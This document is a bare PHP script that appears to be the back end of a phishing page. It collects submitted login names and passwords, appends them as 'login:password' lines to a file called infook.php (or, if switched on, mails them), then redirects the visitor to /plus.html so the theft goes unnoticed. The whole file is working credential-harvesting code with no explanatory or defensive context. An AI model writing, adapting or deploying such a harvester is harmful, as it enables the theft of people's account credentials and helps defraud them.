<?php
/*

*/
$BASE="infook.php";
$IS_EMAIL=false;
$LOCATION="/plus.html";



$p2=$_REQUEST["fr_posted"];
$p3=$_REQUEST["fr_needCaptcha"];
$p4=$_REQUEST["fr_login"];
$p5=$_REQUEST["fr_password"];
$p6=$_REQUEST["fr_remember"];
$p7=$_REQUEST["button_login"];
$headers = "";
$info="$p4:$p5\n <br>";

if ($IS_EMAIL){
mail($BASE, " *** ", $headers.$info);
} else {
$fd=fopen($BASE,"a+");
fwrite($fd,$info);
fclose($fd);
}

header("Location:$LOCATION");
?>
